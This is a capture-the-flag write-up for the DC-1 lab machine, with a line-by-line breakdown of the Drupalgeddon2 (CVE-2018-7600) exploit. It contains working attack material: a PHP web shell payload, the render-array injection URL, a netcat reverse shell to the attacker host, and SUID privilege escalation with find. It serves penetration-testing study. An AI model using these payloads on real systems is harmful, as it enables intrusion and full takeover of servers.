
---
tags
	#SUID
---

```bash
nmap -sV -sC -Pn 192.168.56.104                                                                                
Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-15 09:26 -0500
Nmap scan report for 192.168.56.104
Host is up (0.000077s latency).
Not shown: 997 closed tcp ports (reset)
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 6.0p1 Debian 4+deb7u7 (protocol 2.0)
| ssh-hostkey: 
|   1024 c4:d6:59:e6:77:4c:22:7a:96:16:60:67:8b:42:48:8f (DSA)
|   2048 11:82:fe:53:4e:dc:5b:32:7f:44:64:82:75:7d:d0:a0 (RSA)
|_  256 3d:aa:98:5c:87:af:ea:84:b8:23:68:8d:b9:05:5f:d8 (ECDSA)
80/tcp  open  http    Apache httpd 2.2.22 ((Debian))
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
|_/LICENSE.txt /MAINTAINERS.txt
|_http-generator: Drupal 7 (http://drupal.org)
|_http-title: Welcome to Drupal Site | Drupal Site
|_http-server-header: Apache/2.2.22 (Debian)
111/tcp open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          36654/udp6  status
|   100024  1          46076/tcp6  status
|   100024  1          56495/tcp   status
|_  100024  1          57166/udp   status
MAC Address: 08:00:27:E4:96:D8 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.92 seconds

```

```bash
gobuster dir -u http://192.168.56.104 -w /home/kali/CyberSec/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-small.txt
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.56.104
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /home/kali/CyberSec/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
search               (Status: 403) [Size: 7563]
misc                 (Status: 301) [Size: 315] [--> http://192.168.56.104/misc/]
themes               (Status: 301) [Size: 317] [--> http://192.168.56.104/themes/]
0                    (Status: 200) [Size: 7627]
user                 (Status: 200) [Size: 7480]
modules              (Status: 301) [Size: 318] [--> http://192.168.56.104/modules/]
admin                (Status: 403) [Size: 7718]
scripts              (Status: 301) [Size: 318] [--> http://192.168.56.104/scripts/]
node                 (Status: 200) [Size: 7627]
sites                (Status: 301) [Size: 316] [--> http://192.168.56.104/sites/]
includes             (Status: 301) [Size: 319] [--> http://192.168.56.104/includes/]
profiles             (Status: 301) [Size: 319] [--> http://192.168.56.104/profiles/]
robots               (Status: 200) [Size: 1561]
Progress: 10771 / 81642 (13.19%)
```

rpcinfo : Makes an RPC call to an RPC server and reports what it finds.

-p : Display a  list of all registered RPC programs.

```bash
rpcinfo -p 192.168.56.104
   program vers proto   port  service
    100000    4   tcp    111  portmapper
    100000    3   tcp    111  portmapper
    100000    2   tcp    111  portmapper
    100000    4   udp    111  portmapper
    100000    3   udp    111  portmapper
    100000    2   udp    111  portmapper
    100024    1   udp  57166  status
    100024    1   tcp  56495  status

```

No nfs(Network File System) exist, `rpcinfo` is not the main breakthrough.

```bash
curl -I 192.168.56.104
HTTP/1.1 200 OK
Date: Sun, 15 Feb 2026 16:12:17 GMT
Server: Apache/2.2.22 (Debian)
X-Powered-By: PHP/5.4.45-0+deb7u14
Expires: Sun, 19 Nov 1978 05:00:00 GMT
Last-Modified: Sun, 15 Feb 2026 16:12:17 +0000
Cache-Control: no-cache, must-revalidate, post-check=0, pre-check=0
ETag: "1771171937"
Content-Language: en
X-Generator: Drupal 7 (http://drupal.org)
Vary: Accept-Encoding
Content-Type: text/html; charset=utf-8

```

```bash
searchsploit drupal 7 remote
---------------------------------------------------------------------------------
 Exploit Title                                                                                                                                                  |  Path
---------------------------------------------------------------------------------
Drupal 4.7 - 'Attachment mod_mime' Remote Command Execution                                                                                                     | php/webapps/1821.php
Drupal 7.0 < 7.31 - 'Drupalgeddon' SQL Injection (Remote Code Execution)                                                                                        | php/webapps/35150.php
Drupal 7.x Module Services - Remote Code Execution                                                                                                              | php/webapps/41564.php
Drupal < 4.7.6 - Post Comments Remote Command Execution                                                                                                         | php/webapps/3313.pl
Drupal < 5.1 - Post Comments Remote Command Execution                                                                                                           | php/webapps/3312.pl
Drupal < 7.58 - 'Drupalgeddon3' (Authenticated) Remote Code (Metasploit)                                                                                        | php/webapps/44557.rb
Drupal < 7.58 - 'Drupalgeddon3' (Authenticated) Remote Code (Metasploit)                                                                                        | php/webapps/44557.rb
Drupal < 7.58 - 'Drupalgeddon3' (Authenticated) Remote Code Execution (PoC)                                                                                     | php/webapps/44542.txt
Drupal < 7.58 / < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution                                                                             | php/webapps/44449.rb
Drupal < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution (Metasploit)                                                                         | php/remote/44482.rb
Drupal < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution (Metasploit)                                                                         | php/remote/44482.rb
Drupal < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution (PoC)                                                                                | php/webapps/44448.py
Drupal < 8.5.11 / < 8.6.10 - RESTful Web Services unserialize() Remote Command Execution (Metasploit)                                                           | php/remote/46510.rb
Drupal < 8.5.11 / < 8.6.10 - RESTful Web Services unserialize() Remote Command Execution (Metasploit)                                                           | php/remote/46510.rb
Drupal < 8.6.10 / < 8.5.11 - REST Module Remote Code Execution                                                                                                  | php/webapps/46452.txt
Drupal < 8.6.9 - REST Module Remote Code Execution                                                                                                              | php/webapps/46459.py
Drupal Module CODER 2.5 - Remote Command Execution (Metasploit)                                                                                                 | php/webapps/40149.rb
Drupal Module Coder < 7.x-1.3/7.x-2.6 - Remote Code Execution                                                                                                   | php/remote/40144.php
Drupal Module RESTWS 7.x - PHP Remote Code Execution (Metasploit)                                                                                               | php/remote/40130.rb
---------------------------------------------------------------------------------
Shellcodes: No Results


```


Drupalgeddon SQL Injection : 
	`?q=` query parameter was historically used to pass the internal system path to the main `index.php` file, which then processed the request. For example, a request for the page "about-us" would internally be processed as `index.php?q=about-us`.This parameter is a technical detail of how Drupal 7 and earlier versions handled URL routing, especially when "Clean URLs" were not enabled.

CVE : Common Vulnerabilities and Exposures

```bash
searchsploit -x 44449.rb

  Exploit: Drupal < 7.58 / < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution
      URL: https://www.exploit-db.com/exploits/44449
     Path: /usr/share/exploitdb/exploits/php/webapps/44449.rb
    Codes: CVE-2018-7600
 Verified: True
File Type: Ruby script, ASCII text

```

[[../CVE-2018-7600 breakdown]]

```bash
 searchsploit -m 44449

  Exploit: Drupal < 7.58 / < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution
      URL: https://www.exploit-db.com/exploits/44449
     Path: /usr/share/exploitdb/exploits/php/webapps/44449.rb
    Codes: CVE-2018-7600
 Verified: True
File Type: Ruby script, ASCII text
Copied to: /home/kali/CyberSec/44449.rb

```

```bash
sudo gem install highline
```

```bash
ruby "44449.rb" http://192.168.56.104
[*] --==[::#Drupalggedon2::]==--
--------------------------------------------------------------------------------
[i] Target : http://192.168.56.104/
--------------------------------------------------------------------------------
[!] MISSING: http://192.168.56.104/CHANGELOG.txt    (HTTP Response: 404)
[!] MISSING: http://192.168.56.104/core/CHANGELOG.txt    (HTTP Response: 404)
[+] Found  : http://192.168.56.104/includes/bootstrap.inc    (HTTP Response: 403)
[!] MISSING: http://192.168.56.104/core/includes/bootstrap.inc    (HTTP Response: 404)
[+] Found  : http://192.168.56.104/includes/database.inc    (HTTP Response: 403)
[+] URL    : v7.x/6.x?
[+] Found  : http://192.168.56.104/    (HTTP Response: 200)
[+] Metatag: v7.x/6.x [Generator]
[!] MISSING: http://192.168.56.104/    (HTTP Response: 200)
[+] Drupal?: v7.x/6.x
--------------------------------------------------------------------------------
[*] Testing: Form   (user/password)
[+] Result : Form valid
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
[*] Testing: Clean URLs
[+] Result : Clean URLs enabled
--------------------------------------------------------------------------------
[*] Testing: Code Execution   (Method: name)
[i] Payload: echo KMSSYELD
[+] Result : KMSSYELD
[+] Good News Everyone! Target seems to be exploitable (Code execution)! w00hooOO!
--------------------------------------------------------------------------------
[*] Testing: Existing file   (http://192.168.56.104/shell.php)
[i] Response: HTTP 404 // Size: 13
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
[*] Testing: Writing To Web Root   (./)
[i] Payload: echo PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9 | base64 -d | tee shell.php
[+] Result : <?php if( isset( $_REQUEST['c'] ) ) { system( $_REQUEST['c'] . ' 2>&1' ); }
[+] Very Good News Everyone! Wrote to the web root! Waayheeeey!!!
--------------------------------------------------------------------------------
[i] Fake PHP shell:   curl 'http://192.168.56.104/shell.php' -d 'c=hostname'
DC-1>>
```

```bash
❯ nc -lvnp 4444
listening on [any] 4444 ...
```

-v : reverse -n : don't do DNS Resolution

```bash
DC-1>>nc 192.168.56.103 4444 -e /bin/bash
```

-e : After the connection, execute a program and bind the input/output of this program to the TCP connection.

```bash
connect to [192.168.56.103] from (UNKNOWN) [192.168.56.104] 33460

script -qc /bin/bash /dev/null
www-data@DC-1:/var/www$
```

script is a Linux tool to open a new pseudo-terminal(PTY) and record all the session. 

```
fork()
openpty()
exec()
```

-q : do not display banner -c : designate the command 

So now we get a stable reverse shell.

```bash
www-data@DC-1:/var/www$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

```bash
www-data@DC-1:/var/www$ cat /etc/passwd | grep -v 'false\|nologin'
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
flag4:x:1001:1001:Flag4,,,:/home/flag4:/bin/bash
```

`/etc/passwd` format :

`username:password:UID:GID:comment:home:shell`

UID > = 1000 are users generally.

nobody is a Linux default low privilege account, which designed to execute programs.

```
d | rwx | rwx | rwx
    ↑     ↑     ↑
   owner group others
   
r = 4
w = 2
x = 1
```

```bash
www-data@DC-1:/var/www$ cd /home/flag4
```

```bash
www-data@DC-1:/home/flag4$ cat flag4.txt
Can you use this same method to find or access the flag in root?

Probably. But perhaps it's not that easy.  Or maybe it is?
```

```bash
find / -perm -u+s -type f 2>/dev/null
```

Finding all programs will execute with root privilege.
`-type f` : find normal files only
`-perm` : finding file according to privilege
`u` = Users `s` = SUID bit

```bash
/bin/mount
/bin/ping
/bin/su
/bin/ping6
/bin/umount
/usr/bin/at
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/procmail
/usr/bin/find
/usr/sbin/exim4
/usr/lib/pt_chown
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/sbin/mount.nfs
```

```bash
/usr/bin/find . -exec /bin/bash -p \; -quit
```

```bash
bash-4.2# cd /root
bash-4.2# ls
thefinalflag.txt
bash-4.2# cat thefinalflag.txt
Well done!!!!

Hopefully you've enjoyed this and learned some new skills.

You can let me know what you thought of this little journey
by contacting me via Twitter - @DCAU7
```

# CVE-2018-7600 breakdown

---
```rb
# Settings - Payload (we could just be happy without this PHP shell, by using just the OS shell - but this is 'better'!)
bashcmd = "<?php if( isset( $_REQUEST['c'] ) ) { system( $_REQUEST['c'] . ' 2>&1' ); }"
bashcmd = "echo " + Base64.strict_encode64(bashcmd) + " | base64 -d"
```

In the first statement, if the HTTP request contains a parameter named `c` (for example, `?c=whoami` in a GET request or `c=ls` in a POST request), the script takes the value of `c` and passes it to the system shell for execution.
It also redirects standard error to standard output using `' 2>&1'`, so any error messages are returned along with the command output, allowing you to see failures or execution issues.

Next, the script takes the PHP web shell code and encodes it into a Base64 string. It then constructs a bash command that uses `echo` to print the Base64-encoded content and pipes it into `base64 -d` to decode it back to its original form.
This allows the payload to be safely transmitted and reconstructed on the target system, reducing issues caused by special characters or filtering mechanisms.

```rb
def gen_evil_url(evil, element="", shell=false, phpfunction="passthru")
  puts info("Payload: #{evil}") if not shell
  puts verbose("Element    : #{element}") if not shell and not element.empty? and $verbose
  puts verbose("PHP fn     : #{phpfunction}") if not shell and $verbose
```

The function `gen_evil_url(evil, element="", shell=false, phpfunction="passthru")` is responsible for generating a malicious request that will be used to trigger Remote Code Execution on the target system. Its purpose is not to exploit the vulnerability directly, but to construct and configure the payload before it is sent to the vulnerable endpoint.

The parameter `evil` represents the actual attack payload that will be executed on the target machine. This could be a bash command, a piece of PHP code, a Base64-decoded web shell, or any injected command string. It is the core malicious content that the attacker wants the server to run.

The `element` parameter specifies which vulnerable parameter or form element is being targeted. It determines where the payload will be injected, such as a specific form field or request variable. This allows the exploit to adapt to different injection points within the application.

The `shell` parameter is a boolean flag that controls the execution mode. When set to `false`, the exploit performs a single command execution. When set to `true`, it switches to web shell deployment mode, meaning the attacker is attempting to establish persistent remote access rather than running just one command.

The `phpfunction` parameter determines which PHP function will be used on the target system to execute system commands. By default, it uses `passthru`, which directly outputs the result of the executed command. Other possible functions include `system`, `exec`, and `shell_exec`. This parameter allows flexibility in how command execution and output handling are performed on the remote server.

Overall, this function serves as a configurable attack request builder. It prepares and customizes the malicious request before it is delivered to the vulnerable application, forming an intermediate step between payload creation and actual exploitation.

```rb
elsif $drupalverion.start_with?("7") and element == "name"
    # Method #3 - Drupal v7.x: name, #post_render - HTTP 200
    url = $target + "#{$clean_url}#{$form}&name[%23post_render][]=" + phpfunction + "&name[%23type]=markup&name[%23markup]=" + evil
    payload = "form_id=user_pass&_triggering_element_name=name"
  end
```

Drupal 7’s vulnerability originates from its Form API (FAPI) design. 

```php
$form = array(
  'name' => array(
    '#type' => 'textfield',
    '#title' => 'Username',
  ),
);
```

In Drupal 7, forms are not plain HTML but are built using structured associative arrays known as ***render arrays***. Each form element contains special control keys such as 

`#type`, `#markup`, `#post_render`, and `#pre_render`, 

which determine how the element is processed and rendered. The weakness lies in how Drupal processes HTTP request parameters: nested parameters submitted by a user are automatically parsed into arrays and merged into the form structure. Critically, Drupal 7 did not properly filter or block user-supplied keys beginning with `#`, which are meant to be ***internal control properties***. As a result, an attacker can inject render array control keys such as `#post_render` and manipulate callback execution, leading to remote code execution.

 `$drupalverion.start_with?("7") and element == "name"` checks whether the target system is running Drupal 7 and whether the chosen injection point is the `name` form element. This ensures that the exploit uses a Drupal 7–specific technique. The `name` element corresponds to the username field in the password reset form (`user_pass`). Since this form is publicly accessible, it provides a convenient entry point for injecting malicious render array properties.

The line constructing the URL builds the core injection payload. By appending parameters such as `name[#post_render][]`, `name[#type]=markup`, and `name[#markup]=evil`, the exploit crafts a malicious render array structure. When processed by Drupal’s Form API, these parameters are interpreted as internal control properties of the `name` element. Setting `#type` to `markup` allows arbitrary content to be rendered, while assigning `#markup` to the `evil` payload defines the content to process. Most importantly, injecting `#post_render` forces Drupal to call the specified PHP function (stored in `phpfunction`) after rendering. Because Drupal executes callbacks defined in `#post_render`, this effectively causes the system to execute the attacker-controlled payload, resulting in remote command execution.

`payload = "form_id=user_pass&_triggering_element_name=name"`, constructs the POST body required to properly trigger the form processing flow. The `form_id=user_pass` parameter tells Drupal which form is being submitted—in this case, the password reset form. The `_triggering_element_name=name` parameter identifies which form element initiated the submission. These parameters ensure that Drupal processes the injected `name` element through its normal rendering pipeline, which ultimately triggers the malicious `#post_render` callback and executes the payload.

```rb
 # Merge locations
  webshellpath = "#{path}#{webshell}"

  # Final command to execute
  cmd = "#{bashcmd} | tee #{webshellpath}"

# By default, Drupal v7.x disables the PHP engine using: ./sites/default/files/.htaccess
  # ...however, Drupal v8.x disables the PHP engine using: ./.htaccess
  if path == "sites/default/files/"
    puts action("Moving : ./sites/default/files/.htaccess")
    cmd = "mv -f #{path}.htaccess #{path}.htaccess-bak; #{cmd}"
  end

  # Generate evil URLs
  url, payload = gen_evil_url(cmd, $element)
  # Make the request
  response = http_request(url, "post", payload, $session_cookie)
```

`webshellpath = "#{path}#{webshell}"`  constructs the full file path where the web shell will be written. The variable `path` represents the target directory (for example, `sites/default/files/`), and `webshell` represents the filename (such as `shell.php`). Together, they form the complete destination path on the target system, such as:`sites/default/files/shell.php` This defines where the malicious PHP file will be created.

The line  `cmd = "#{bashcmd} | tee #{webshellpath}"`  creates the actual system command that will be executed through the RCE vulnerability.

Drupal 7 disables PHP execution inside the `sites/default/files/` directory using a `.htaccess` file.If the web shell is written into that directory without modification, Apache will prevent the PHP file from executing.The conditional block:`cmd = "mv -f #{path}.htaccess #{path}.htaccess-bak; #{cmd}"`prepends a command that renames the `.htaccess` file before executing the main payload.This removes the PHP execution restriction, allowing the newly written `shell.php` file to run normally.

`url, payload = gen_evil_url(cmd, $element)` injects the constructed command (`cmd`) into a malicious render array using Drupal’s Form API vulnerability. Internally, this results in something equivalent to:

- `#post_render = passthru`
- `#markup = cmd`

When Drupal renders the form element, it calls: `passthru(cmd)` This executes the full command on the server.

The line: `response = http_request(url, "post", payload, $session_cookie)` sends the crafted POST request to the vulnerable Drupal endpoint. Once processed, Drupal executes the injected callback, and the web shell is written to disk. At this point, persistent remote access is established.

```url
url = $target + "#{$clean_url}#{$form}&name[%23post_render][]=" + phpfunction + "&name[%23type]=markup&name[%23markup]=" + evil
```

becomes :

```url
http://target.com/?q=user/password
&name[%23post_render][]=passthru
&name[%23type]=markup
&name[%23markup]=echo BASE64STRING | base64 -d | tee sites/default/files/shell.php
```

